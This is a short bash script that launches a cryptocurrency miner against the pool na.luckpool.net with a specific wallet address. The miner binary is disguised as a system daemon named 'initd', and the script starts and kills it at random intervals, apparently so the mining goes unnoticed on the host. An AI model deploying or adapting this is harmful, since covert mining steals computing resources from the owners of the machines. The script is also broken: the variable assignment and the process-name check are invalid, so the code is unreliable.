run_this_command = "/usr/local/bin/initd -v -l na.luckpool.net:3960 -u RSqyBuPVpEA2mKq2pLx3YZj7ySWuXpMx3N.cpvgullo001 -p x"
# Minimum and range values for random Wait before start in seconds
MinA=60;RangeA=150 
# Minimum and range values for random Wait before kill in seconds
MinB=60; RangeB=150 # 
while true ; do
    sleep $[ ( $RANDOM % $RangeA ) + $MinA ] 
    run_this_command &
    last_pid=$!
    sleep $[ ( $RANDOM % $RangeB ) + $MinB ] 
    { [ "$(ps -p $last_pid -o comm= )" ] && \
      [ "$(ps -p $last_pid -o comm= )" = run_this_command ]
    } && \{ kill -KILL $last_pid ;}
done
